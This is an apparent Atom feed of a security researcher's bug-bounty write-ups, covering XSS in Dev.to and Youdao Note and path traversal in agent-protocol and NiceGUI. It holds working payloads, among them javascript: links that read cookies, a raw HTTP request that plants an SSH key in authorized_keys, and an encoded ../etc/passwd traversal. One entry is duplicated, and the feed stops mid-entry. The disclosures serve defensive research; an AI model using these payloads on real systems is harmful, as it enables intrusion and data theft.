<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T19:15:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Devto cta xss</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>Medium</p>
</blockquote>

<h2 id="summary">Summary</h2>

<p>DEV is a community of software developers which is built on <a href="https://github.com/forem">Forem</a>: open source software designed to empower communities. You can edit your blog with its buildin markdown editor using liquid markdown syntax.</p>

<p>For example, <a href="https://dev.to/devteam/lesser-known-features-of-dev-embedding-call-to-action-cta-buttons-2gni">CTA</a> uses 
<code class="language-plaintext highlighter-rouge">{% cta link %} desc {% endcta %}</code>
 to create a button with a link to jump to. However, the backend didn’t sanitize <code class="language-plaintext highlighter-rouge">javascript</code> link, causing click xss.</p>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>Create a post or comment, in the editor, send following payload:</p>

    <p><code class="language-plaintext highlighter-rouge">{% cta javascript:alert(document.domain) %} clickme {% endcta %}</code></p>

    <p><img src="/assets/images/bughunter/dev1.png" alt="dev1" /></p>

    <p><img src="/assets/images/bughunter/dev-com1.png" alt="dev1" /></p>
  </li>
  <li>
    <p>After payload sent, a button is rendered, click the button, the xss is triggered!</p>

    <p><img src="/assets/images/bughunter/dev2.png" alt="dev2" /></p>

    <p><img src="/assets/images/bughunter/dev3.png" alt="dev3" /></p>

    <p><img src="/assets/images/bughunter/dev-com2.png" alt="dev2" /></p>

    <p><img src="/assets/images/bughunter/dev-com3.png" alt="dev3" /></p>
  </li>
  <li>
    <p>Using chrome dev tools to check the rendered result:</p>

    <p><img src="/assets/images/bughunter/dev-com4.png" alt="dev4" /></p>
  </li>
</ol>

<h3 id="root-cause">Root cause</h3>

<p>Forem codebase: <a href="https://github.com/forem/forem/blob/154cd202b29186ede9850f9807ac4dc76eda6e34/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="&lt;%= link %&gt;" class="ltag_cta ltag_cta--&lt;%= type %&gt;" role="button"&gt;&lt;%= description %&gt;&lt;/a&gt;
</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版白板存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/04/30/xss-excalidraw.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版白板存在存储型XSS漏洞" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-excalidraw</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-excalidraw.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>有道云笔记网页版白板存在存储型XSS漏洞</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>存储型XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>中危</p>
</blockquote>

<h2 id="url">URL</h2>
<ul>
  <li>POC网页: <a href="https://note.youdao.com/s/5DooTGzS">https://note.youdao.com/s/5DooTGzS</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>有道云白板使用过时<code class="language-plaintext highlighter-rouge">excalidraw</code>，该插件存在已知xss漏洞：给任意白板元素添加链接时，没有过滤链接的协议，攻击者能够构造javascript链接，受害者点击元素后触发javascript payload执行</p>

<h3 id="detail">Detail</h3>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>打开有道云网页版，新建白板，在白板中画任意元素。</p>
  </li>
  <li>
    <p>选定该元素，点击添加添加链接，链接框填写如下payload：<code class="language-plaintext highlighter-rouge">javascript://%0aalert(document.cookie)</code></p>

    <p><img src="/assets/images/youdaoyun2/excalidraw1.png" alt="excalidraw1" /></p>
  </li>
  <li>
    <p>点击元素链接后，xss触发。分享给他人，只需点击一次即可触发xss。</p>

    <p><img src="/assets/images/youdaoyun2/excalidraw2.png" alt="excalidraw2" /></p>

    <p><img src="/assets/images/youdaoyun2/excalidraw3.png" alt="excalidraw3" /></p>
  </li>
</ol>

<h3 id="proof">Proof</h3>
<p>请提供截图或视频</p>

<p>POC链接：
https://note.youdao.com/s/5DooTGzS</p>

<p>参考：<a href="https://github.com/advisories/GHSA-v7v8-gjv7-ffmr">https://github.com/advisories/GHSA-v7v8-gjv7-ffmr</a></p>

<h2 id="impact">Impact</h2>

<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>

<h2 id="patch-advice">Patch advice</h2>

<ol>
  <li>升级渲染excalidraw插件到最新版本</li>
</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版思维导图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/04/30/xss-mindmap.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版思维导图存在存储型XSS漏洞" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-mindmap</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-mindmap.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>有道云笔记网页版思维导图存在存储型XSS漏洞</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>存储型XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>中危</p>
</blockquote>

<h2 id="url">URL</h2>
<ul>
  <li>POC网页: <a href="https://note.youdao.com/s/JOK4BY08">https://note.youdao.com/s/JOK4BY08</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>有道云笔记<code class="language-plaintext highlighter-rouge">mindmap</code>思维导图能够插入<code class="language-plaintext highlighter-rouge">javascript</code>链接，受害者点击链接后可触发xss执行。</p>

<h4 id="trigger">Trigger</h4>

<ol>
  <li>
    <p>打开有道云网页版，新建脑图。添加分支主题，选中该分支，然后点击插入链接。</p>

    <p><img src="/assets/images/youdaoyun2/mindmap1.png" alt="mindmap1" /></p>
  </li>
  <li>
    <p>输入任意url，开启burpsuite拦截请求：<code class="language-plaintext highlighter-rouge">POST /yws/api/personal/sync</code>。该请求将用户最新修改发送到后台。由于前端对url做了过滤，只能输入http协议，因此通过该请求修改成javascript协议。</p>

    <p><img src="/assets/images/youdaoyun2/mindmap2.png" alt="mindmap2" /></p>

    <p><img src="/assets/images/youdaoyun2/mindmap3.png" alt="mindmap3" /></p>
  </li>
  <li>
    <p>发送请求，修改url链接成功，链接连接后，xss触发。</p>

    <p><img src="/assets/images/youdaoyun2/mindmap4.png" alt="mindmap4" /></p>
  </li>
</ol>

<h3 id="proof">Proof</h3>
<p>请提供截图或视频</p>

<p>POC链接：
<a href="https://note.youdao.com/s/JOK4BY08">https://note.youdao.com/s/JOK4BY08</a></p>

<p>视频：</p>

<p>链接：<a href="https://pan.baidu.com/s/1KpYkdI1SHA2q21sij1mJpA">https://pan.baidu.com/s/1KpYkdI1SHA2q21sij1mJpA</a></p>

<p>提取码：1314</p>

<h2 id="impact">Impact</h2>

<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <code class="language-plaintext highlighter-rouge">/ap/v1/agent/tasks//artifacts</code> endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the agent-protocol python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a simple server using example from <a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from agent_protocol import Agent, Task, Step

async def task_handler(task: Task) -&gt; None:
    print(f"task: {task.input}")
    await Agent.db.create_step(task.task_id, task.input)

async def step_handler(step: Step) -&gt; Step:
    print(f"step: {step.input}")
    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
    step.output = step.input
    return step

Agent.setup_agent(task_handler, step_handler).start()
</code></pre></div></div>
<p>Start server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mimimal.py
</code></pre></div></div>

<p>Then, create a task and get taskid:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 61

{
    "input": "test"
}
</code></pre></div></div>

<p>Using taskid we created and upload <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, set filename to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2368

----------------------------590741319467185743628097
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/javascript

ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
----------------------------590741319467185743628097--
</code></pre></div></div>

<p>The response indicates success with artifact file path.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Content-Length: 169
Connection: keep-alive
Content-Type: application/json
Date: Wed, 10 Apr 2024 06:38:25 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: hypercorn-h11

{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
</code></pre></div></div>

<p>We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<p>Warning: this bug also affects <a href="https://github.com/smol-ai/developer">smol.ai</a></p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer.html"><![CDATA[<h2 id="name">Name</h2>

<p>TODO：</p>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <code class="language-plaintext highlighter-rouge">/ap/v1/agent/tasks//artifacts</code> endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the agent-protocol python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a simple server using example from <a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from agent_protocol import Agent, Task, Step

async def task_handler(task: Task) -&gt; None:
    print(f"task: {task.input}")
    await Agent.db.create_step(task.task_id, task.input)

async def step_handler(step: Step) -&gt; Step:
    print(f"step: {step.input}")
    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
    step.output = step.input
    return step

Agent.setup_agent(task_handler, step_handler).start()
</code></pre></div></div>
<p>Start server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mimimal.py
</code></pre></div></div>

<p>Then, create a task and get taskid:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 61

{
    "input": "test"
}
</code></pre></div></div>

<p>Using taskid we created and upload <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, set filename to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2368

----------------------------590741319467185743628097
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/javascript

ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
----------------------------590741319467185743628097--
</code></pre></div></div>

<p>The response indicates success with artifact file path.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Content-Length: 169
Connection: keep-alive
Content-Type: application/json
Date: Wed, 10 Apr 2024 06:38:25 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: hypercorn-h11

{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
</code></pre></div></div>

<p>We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<p>Warning: this bug also affects <a href="https://github.com/smol-ai/developer">smol.ai</a></p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</title><link href="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" rel="alternate" type="text/html" title="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>NiceGUI: Local File Inclusion in NiceGUI leaflet component</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="cve">CVE</h2>

<blockquote>
  <p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</a></p>
</blockquote>

<h2 id="description">Description</h2>

<p>A local file inclusion is present in the NiceUI leaflet component when requesting resource files under the <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> route.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">route</a> <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> is used for <a href="https://github.com/zauberzeug/nicegui/commit/b465af3bb7a825c89ca6562e5eb7ebfeee5bb589">serving CSS and JS resources locally</a>. The <code class="language-plaintext highlighter-rouge">path</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">..</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.get(f'/_nicegui/{__version__}' + '/resources/{key}/{path:path}')
def _get_resource(key: str, path: str) -&gt; FileResponse:
    if key in resources:
        filepath = resources[key].path / path
        if filepath.exists():
            headers = {'Cache-Control': 'public, max-age=3600'}
            media_type, _ = mimetypes.guess_type(filepath)
            return FileResponse(filepath, media_type=media_type, headers=headers)
    raise HTTPException(status_code=404, detail=f'resource "{key}" not found')
</code></pre></div></div>

<p>However, the <code class="language-plaintext highlighter-rouge">resources</code> is only <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/elements/leaflet.py#L40">initialized</a> by <code class="language-plaintext highlighter-rouge">ui.leaflet</code> component. To exploit the bug, a developer should use <code class="language-plaintext highlighter-rouge">leaflet</code> component in web pages so that the route is activated. Consider following <a href="https://nicegui.io/documentation/leaflet#leaflet_map">code snippet</a> from official document.</p>

<p>Firstly, install nicegui using <code class="language-plaintext highlighter-rouge">python pip</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nicegui
</code></pre></div></div>
<p>Then, save following code to <code class="language-plaintext highlighter-rouge">main.py</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nicegui import ui

m = ui.leaflet(center=(51.505, -0.09))
ui.label().bind_text_from(m, 'center', lambda center: f'Center: {center[0]:.3f}, {center[1]:.3f}')
ui.label().bind_text_from(m, 'zoom', lambda zoom: f'Zoom: {zoom}')

with ui.grid(columns=2):
    ui.button('London', on_click=lambda: m.set_center((51.505, -0.090)))
    ui.button('Berlin', on_click=lambda: m.set_center((52.520, 13.405)))
    ui.button(icon='zoom_in', on_click=lambda: m.set_zoom(m.zoom + 1))
    ui.button(icon='zoom_out', on_click=lambda: m.set_zoom(m.zoom - 1))

ui.run()
</code></pre></div></div>
<p>Run the application, it will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080</code> by default.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python main.py
</code></pre></div></div>
<p>Open the webpage in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/leaflet/leaflet.js HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cache-Control: no-cache
Cookie: 
Pragma: no-cache
Referer: http://10.15.0.171:8080/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
Host: 10.15.0.171:8080
Accept-Encoding: gzip, deflate
Connection: close
</code></pre></div></div>
<p>Modify the request by change <code class="language-plaintext highlighter-rouge">leaflet/leaflet.js</code> part to <code class="language-plaintext highlighter-rouge">%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> which is <code class="language-plaintext highlighter-rouge">../../../../../etc/passwd</code> url-encoded content.</p>

